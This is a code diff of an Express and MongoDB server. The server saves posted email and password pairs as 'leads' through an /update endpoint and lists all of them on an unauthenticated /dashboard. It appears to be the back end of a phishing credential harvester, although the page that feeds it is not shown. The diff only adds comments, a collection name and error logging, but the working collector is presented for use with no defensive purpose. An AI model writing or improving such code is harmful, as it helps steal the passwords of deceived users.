@@ -8,11 +8,12 @@ app.use(cors());
 app.use(bodyParser.json());
 app.use(express.static('public'));
 
-// Connect to MongoDB
+// Connect to MongoDB using the URI from your environment variables
 mongoose.connect(process.env.MONGO_URI)
   .then(() => console.log("Connected to MongoDB successfully"))
   .catch(err => console.error("Mongo connection error:", err));
 
+// Define Schema and specify the collection name 'leads'
 const leadSchema = new mongoose.Schema({
     email: String,
     password: String,
@@ -21,28 +22,32 @@ const leadSchema = new mongoose.Schema({
     timestamp: { type: Date, default: Date.now }
 });
 
-const Lead = mongoose.model('Lead', leadSchema);
+const Lead = mongoose.model('Lead', leadSchema, 'leads');
 
+// Endpoint to receive data from frontend
 app.post('/update', async (req, res) => {
     try {
         const lead = new Lead(req.body);
         await lead.save();
         res.status(200).send("Saved.");
     } catch (err) {
+        console.error("Save error:", err);
         res.status(500).send("Error.");
     }
 });
 
+// Endpoint to serve the dashboard
 app.get('/dashboard', async (req, res) => {
     try {
         const leads = await Lead.find().sort({ timestamp: -1 });
         res.json(leads);
     } catch (err) {
-        res.status(500).send("Error.");
+        console.error("Fetch error:", err);
+        res.status(500).send("Error fetching leads.");
     }
 });
 
-// Changed this to match the filename you created
+// Serve the dashboard.html file
 app.get('/dashboard.html', (req, res) => {
     res.sendFile(__dirname + '/dashboard.html');
 });
